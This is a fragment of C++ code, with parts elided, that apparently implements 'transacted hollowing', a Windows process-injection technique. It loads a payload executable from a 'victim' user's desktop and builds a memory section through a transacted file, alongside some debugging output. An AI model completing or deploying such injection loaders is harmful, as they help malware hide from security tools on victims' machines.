...
BYTE* GetPayloadBuffer(OUT size_t& p_size) {
	HANDLE hFile = CreateFileW(L"C:\\Users\\victim\\Desktop\\transact hollowing\\payload.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
...
HANDLE MakeSectionWithTransaction(BYTE* payload, DWORD payloadSize) {
	...
	lstrcpyW(targetPath, L"C:\\Users\\victim\\Desktop\\mynotes.txt");
	...
	if (hTransactedFile == INVALID_HANDLE_VALUE) {
		...
		std::cout << "GetLastError: " << GetLastError() << std::endl; // Add this line
		exit(-1);
	}
